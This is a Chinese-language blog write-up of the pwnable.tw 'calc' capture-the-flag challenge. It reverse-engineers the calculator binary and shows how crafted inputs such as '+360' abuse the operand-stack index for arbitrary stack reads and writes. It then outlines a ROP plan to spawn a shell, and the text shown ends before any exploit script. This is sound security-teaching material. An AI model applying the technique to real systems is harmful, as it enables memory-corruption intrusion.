@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"juniorprincewang.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.18.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="本题考查的是对程序逻辑的理解，达到任意地址读写的目的，并最终利用ROP技术执行execve(&#39;&#x2F;bin&#x2F;sh&#39;)。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.tw之calc">
+<meta property="og:url" content="http://juniorprincewang.github.io/2017/10/01/pwnable-tw%E4%B9%8Bcalc/index.html">
+<meta property="og:site_name" content="TO DO">
+<meta property="og:description" content="本题考查的是对程序逻辑的理解，达到任意地址读写的目的，并最终利用ROP技术执行execve(&#39;&#x2F;bin&#x2F;sh&#39;)。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2017-10-01T10:19:50.000Z">
+<meta property="article:modified_time" content="2022-01-09T11:09:07.900Z">
+<meta property="article:author" content="Max">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="pwnable.tw">
+<meta property="article:tag" content="rop">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://juniorprincewang.github.io/2017/10/01/pwnable-tw%E4%B9%8Bcalc/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://juniorprincewang.github.io/2017/10/01/pwnable-tw%E4%B9%8Bcalc/","path":"2017/10/01/pwnable-tw之calc/","title":"pwnable.tw之calc"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>pwnable.tw之calc | TO DO</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="/custom_css_source.css">
+<!-- hexo injector head_end end --><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">TO DO</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">吾尝终日而思矣，不如须臾之所学也。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">题目分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#parse_expr%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">parse_expr分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81"><span class="nav-number">2.</span> <span class="nav-text">代码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Max</p>
+  <div class="site-description" itemprop="description">文章本天成，妙手偶得之。</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">92</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">97</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/juniorprincewang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;juniorprincewang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:maxzywang@163.com" title="E-Mail → mailto:maxzywang@163.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://juniorprincewang.github.io/2017/10/01/pwnable-tw%E4%B9%8Bcalc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Max">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TO DO">
+      <meta itemprop="description" content="文章本天成，妙手偶得之。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="pwnable.tw之calc | TO DO">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwnable.tw之calc
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2017-10-01 18:19:50" itemprop="dateCreated datePublished" datetime="2017-10-01T18:19:50+08:00">2017-10-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-01-09 19:09:07" itemprop="dateModified" datetime="2022-01-09T19:09:07+08:00">2022-01-09</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>本题考查的是对程序逻辑的理解，达到任意地址读写的目的，并最终利用ROP技术执行<code>execve('/bin/sh')</code>。
+<span id="more"></span></p>
+<h1 id="题目分析">题目分析</h1>
+<p>做过了前面<code>pwnable.tw</code>两道题后，第三题calc的难度突然增大。
+<code>checksec</code>检查下开启了<code>canary</code>和<code>NX</code>。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<p>通过IDA
+pro分析，并没有发现栈溢出和堆溢出的逻辑，倒是发现了程序在<code>parse_expr</code>函数中，通过<code>malloc</code>得到的堆内存没有<code>free</code>掉。</p>
+<p>那好只能捋一遍逻辑了。
+<code>main</code>函数没什么可分析的，直接进入<code>calc</code>函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">int calc()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [sp+18h] [bp-5A0h]@4</span><br><span class="line">  int v2[100]; // [sp+1Ch] [bp-59Ch]@5</span><br><span class="line">  char s; // [sp+1ACh] [bp-40Ch]@2</span><br><span class="line">  int v4; // [sp+5ACh] [bp-Ch]@1</span><br><span class="line"></span><br><span class="line">  v4 = *MK_FP(__GS__, 20);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    bzero(&amp;s, 0x400u);</span><br><span class="line">    if ( !get_expr((int)&amp;s, 1024) )</span><br><span class="line">      break;</span><br><span class="line">    init_pool(&amp;v1);</span><br><span class="line">    if ( parse_expr((int)&amp;s, &amp;v1) )</span><br><span class="line">    &#123;</span><br><span class="line">      printf((const char *)&amp;unk_80BF804, v2[v1 - 1]);</span><br><span class="line">      fflush((int)stdout);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__GS__, 20) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>calc</code>函数主要逻辑最外层是无线循环，变量<code>s</code>是0x400大小的数组，并每次循环清空为零；
+<code>get_expr((int)&amp;s, 1024)</code>的作用是将用户输入的计算公式包括(0-9、+、-、*、
+/、 %)
+存入变量<code>s</code>中。可知变量<code>s</code>代表<code>char[0x400]</code>。
+<code>init_pool(&amp;v1);</code>的作用是将变量<code>v1</code>的101个<code>_DWORD</code>大小的元素清空置零。而从变量声明来看，<code>v1</code>表示<code>int[101]</code>,可以看作<code>v2</code>是<code>v1</code>的第二个元素。</p>
+<p><code>parse_expr((int)&amp;s, &amp;v1)</code>用来处理字符串<code>s</code>，并计算结果保存在<code>v1</code>；
+<code>printf((const char *)&amp;unk_80BF804, v2[v1 - 1]);</code>
+打印计算结果，计算结果存放在<code>v2</code>中，也可以认为存放在<code>v1</code>中。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__cdecl init_pool(_DWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; // eax@1</span><br><span class="line">  signed int i; // [sp+Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  result = a1;</span><br><span class="line">  *a1 = 0;</span><br><span class="line">  for ( i = 0; i &lt;= 99; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = a1;</span><br><span class="line">    a1[i + 1] = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="parse_expr分析">parse_expr分析</h2>
+<p><code>parse_expr((int)&amp;s, &amp;v1)</code>的作用是本程序的重要逻辑，负责计算公式。计算公式结果无非就是处理操作数和操作符，利用两个栈来处理，同时注意操作符的优先级。按照这个思路来分析本体会很清晰。
+分析此函数，形参<code>a1</code>是用户输入公式的过滤字符串，包含（0-9，+，-，*，/，%）。<code>a2</code>存储中间的计算结果。</p>
+<p>程序逐一遍历字符串<code>a1</code>，直到碰到非数字字符，这里<code>(unsigned int)(*(_BYTE *)(i + a1) - 48) &gt; 9</code>的意思是<code>a1[i]-'0'的绝对值大于9</code>，<code>unsigned int</code>将负数转换成大整数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [52]: chr(42)</span><br><span class="line">Out[52]: &#x27;*&#x27;</span><br><span class="line">In [53]: chr(43)</span><br><span class="line">Out[53]: &#x27;+&#x27;</span><br><span class="line">In [55]: chr(45)</span><br><span class="line">Out[55]: &#x27;-&#x27;</span><br><span class="line">In [57]: chr(47)</span><br><span class="line">Out[57]: &#x27;/&#x27;</span><br><span class="line">In [58]: chr(37)</span><br><span class="line">Out[58]: &#x27;%&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>接下来将之前连续的数字字符保存在<code>s1</code>中，<code>!strcmp(s1, "0")</code>判断防止除零，但是有bug，但是不是我们想要的。
+在转换字符串<code>s1</code>为整数<code>v10</code>后,
+<code>v4 = (*a2)++;</code>
+<code>a2[v4 + 1] = v10;</code>这两句很关键，变量<code>a2</code>的第一个元素存储操作数的个数，<code>a2</code>之后当作存储操作数的栈。
+具体的写到了下面代码中。到此还没有发现问题，只能继续分析<code>eval(a2, s[v8]);</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">signed int __cdecl parse_expr(int a1, _DWORD *a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // ST2C_4@3</span><br><span class="line">  signed int result; // eax@4</span><br><span class="line">  int v4; // eax@6</span><br><span class="line">  int v5; // ebx@25</span><br><span class="line">  int v6; // [sp+20h] [bp-88h]@1</span><br><span class="line">  int i; // [sp+24h] [bp-84h]@1</span><br><span class="line">  int v8; // [sp+28h] [bp-80h]@1</span><br><span class="line">  char *s1; // [sp+30h] [bp-78h]@3</span><br><span class="line">  int v10; // [sp+34h] [bp-74h]@5</span><br><span class="line">  char s[100]; // [sp+38h] [bp-70h]@1</span><br><span class="line">  int v12; // [sp+9Ch] [bp-Ch]@1</span><br><span class="line"></span><br><span class="line">  v12 = *MK_FP(__GS__, 20);</span><br><span class="line">  v6 = a1;</span><br><span class="line">  v8 = 0;</span><br><span class="line">  bzero(s, 0x64u);</span><br><span class="line">  for ( i = 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">  	// a1[i]-&#x27;0&#x27;的绝对值大于9</span><br><span class="line">    if ( (unsigned int)(*(_BYTE *)(i + a1) - 48) &gt; 9 ) </span><br><span class="line">    &#123;</span><br><span class="line">      v2 = i + a1 - v6;</span><br><span class="line">      s1 = (char *)malloc(v2 + 1);</span><br><span class="line">      memcpy(s1, v6, v2);</span><br><span class="line">      s1[v2] = 0;</span><br><span class="line">      if ( !strcmp(s1, &quot;0&quot;) )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;prevent division by zero&quot;);</span><br><span class="line">        fflush((int)stdout);</span><br><span class="line">        result = 0;</span><br><span class="line">        goto LABEL_25;</span><br><span class="line">      &#125;</span><br><span class="line">      v10 = atoi(s1);</span><br><span class="line">      if ( v10 &gt; 0 )</span><br><span class="line">      &#123;</span><br><span class="line">      	// 变量`a2`的第一个元素存储操作数的个数，`a2`之后当作存储操作数的栈。</span><br><span class="line">        v4 = (*a2)++;</span><br><span class="line">        a2[v4 + 1] = v10;</span><br><span class="line">      &#125;</span><br><span class="line">      // 判断字符串中符号后面是否还是符号</span><br><span class="line">      if ( *(_BYTE *)(i + a1) &amp;&amp; (unsigned int)(*(_BYTE *)(i + 1 + a1) - 48) &gt; 9 )</span><br><span class="line">      &#123;</span><br><span class="line">        puts(&quot;expression error!&quot;);</span><br><span class="line">        fflush((int)stdout);</span><br><span class="line">        result = 0;</span><br><span class="line">        goto LABEL_25;</span><br><span class="line">      &#125;</span><br><span class="line">      // 记录上次数字开始位置</span><br><span class="line">      v6 = i + 1 + a1;</span><br><span class="line">      // s[v8] 是操作符栈, 如果是第一次，赋值当前操作符；否则去处理。</span><br><span class="line">      if ( s[v8] )</span><br><span class="line">      &#123;</span><br><span class="line">      	// 判断操作符</span><br><span class="line">        switch ( *(_BYTE *)(i + a1) )</span><br><span class="line">        &#123;</span><br><span class="line">          case 43: // +</span><br><span class="line">          case 45: // -</span><br><span class="line">            eval(a2, s[v8]);</span><br><span class="line">            s[v8] = *(_BYTE *)(i + a1);</span><br><span class="line">            break;</span><br><span class="line">          case 37: // %</span><br><span class="line">          case 42: // *</span><br><span class="line">          case 47: // /</span><br><span class="line">            // %,*,%优先级高，优先计算，类似9*9/3</span><br><span class="line">            if ( s[v8] != 43 &amp;&amp; s[v8] != 45 )</span><br><span class="line">            &#123;</span><br><span class="line">              eval(a2, s[v8]);</span><br><span class="line">              s[v8] = *(_BYTE *)(i + a1);</span><br><span class="line">            &#125;</span><br><span class="line">            else // 类似9+9*3</span><br><span class="line">            &#123;</span><br><span class="line">              s[++v8] = *(_BYTE *)(i + a1);</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">          default:</span><br><span class="line">            eval(a2, s[v8--]);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        s[v8] = *(_BYTE *)(i + a1);</span><br><span class="line">      &#125;</span><br><span class="line">      if ( !*(_BYTE *)(i + a1) )</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v8 &gt;= 0 )</span><br><span class="line">    eval(a2, s[v8--]);</span><br><span class="line">  result = 1;</span><br><span class="line">LABEL_25:</span><br><span class="line">  v5 = *MK_FP(__GS__, 20) ^ v12;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在<code>eval</code>中，形参<code>a2</code>是操作符，形参<code>a1</code>有两个责任，<code>a1[0]</code>记录着操作数栈上的个数，<code>a1[1:]</code>是操作数栈。
+比如：<code>10+20-50</code>,在处理<code>-</code>时，进入<code>eval</code>函数,进行的处理为：
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">初始： a1[0]=2, a1[1]=10, a1[2]=20, a2=&#x27;+&#x27;，</span><br><span class="line">这时的做法是`a1[a1[0] -1] += a1[ a1[0] ]`,即a1[1]+=a[12],a1[1] = 30</span><br><span class="line">--a1[0] ；</span><br><span class="line">结束： a1[0] = 1；a1[1] = 30</span><br></pre></td></tr></table></figure></p>
+<p>所以，操作数栈最终的元素只剩下一个，<code>a1[0] = 1</code>。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__cdecl eval(_DWORD *a1, char a2)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; // eax@12</span><br><span class="line"></span><br><span class="line">  if ( a2 == 43 )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[*a1 - 1] += a1[*a1];</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( a2 &gt; 43 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a2 == 45 )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[*a1 - 1] -= a1[*a1];</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( a2 == 47 )</span><br><span class="line">    &#123;</span><br><span class="line">      a1[*a1 - 1] /= a1[*a1];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( a2 == 42 )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[*a1 - 1] *= a1[*a1];</span><br><span class="line">  &#125;</span><br><span class="line">  result = a1;</span><br><span class="line">  --*a1;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>最后的最后，<code>main</code>函数输出<code>printf((const char *)&amp;unk_80BF804, v2[v1 - 1]);</code>，这里相当于取值<code>a1[a1[0] -1+1]=a1[a1[0]]</code>。
+分析到这里，老铁，好像没毛病。 ## 逆向思考</p>
+<p>本着任意地址读写的目的，如果我们能够控制<code>a1[0]</code>,那么我们就可以读取栈上从a1开始的任意数据了。
+怎么控制<code>a1[0]</code>呢，只能逆向推过去，分析<code>eval</code>，<code>a1[*a1 - 1] += a1[*a1];</code>，哈哈，控制<code>a1[0]</code>就是让<code>a1[0] = 1</code>；
+因为只有这样，<code>a1[ a1[0] -1 ] += a1[ a1[0] ]</code>才成立；
+<code>a1[0] = a1[0] + a1[1] = 1+a1[1]</code>。注意，“-，/，%”不好使，<code>*</code>也可以，因为相当于<code>a1[0] = a1[0] * a1[1] = 1*a1[1]</code>，也可以用，不过最后<code>a1[0]-1</code>。
+继续逆向分析，怎么让<code>a1[0]</code>为1？由于<code>a1</code>是操作数栈，让操作数为1个即可，只能让左操作数为空了。
+尝试<code>+10</code>，这可以泄露出<code>a1[10]</code>的值，不过好像没什么卵用。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  calc ./calc</span><br><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">+10</span><br><span class="line">0</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<p>为什么会是0，哪里设置过了吗？查看<code>calc</code>，还真是。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">···</span><br><span class="line">bzero(&amp;s, 0x400u);</span><br><span class="line">   ···</span><br><span class="line">   init_pool(&amp;v1);</span><br><span class="line">   ···</span><br></pre></td></tr></table></figure></p>
+<p><code>a1（即v1）</code>距离<code>ebp</code>偏移量为0x5a0，转换成数组下标为0x5a0/4=360。
+这次重新尝试，泄露<code>ebp</code>中的内容 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  calc ./calc</span><br><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">+360</span><br><span class="line">-5665800</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<p>老铁，成功了一半，我们只是能够读任意地址了，如何写呢？
+很简单，<code>a1[*a1 - 1] += a1[*a1];</code>由于经过<code>+360</code>我们已经控制了<code>a1[0]</code>,那么之后无论再进行如何操作，都是对<code>a1[a1[0]]</code>的操作。
+比如：由于每轮计算清空<code>v1</code>和<code>s</code>，所以不一样，没关系，已经证明可以更改。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  calc ./calc</span><br><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">+20</span><br><span class="line">0</span><br><span class="line">+20+10 </span><br><span class="line">10</span><br><span class="line">+20+40</span><br><span class="line">40</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<p>到这，栈上任意地址可读可写。该题的漏洞允许攻击者绕过canary直接篡改返回值，因此canary的值不变。
+由于程序开启了NX保护，无法在栈上执行shellcode。而且程序是静态编译的。考虑的使用ROP技术来调用<code>execve("/bin/sh")</code>来启动
+shell，再通过cat命令查看flag的内容。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  calc objdump -R calc</span><br><span class="line"></span><br><span class="line">calc:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">objdump: calc: not a dynamic object</span><br><span class="line">objdump: calc: Invalid operation</span><br></pre></td></tr></table></figure></p>
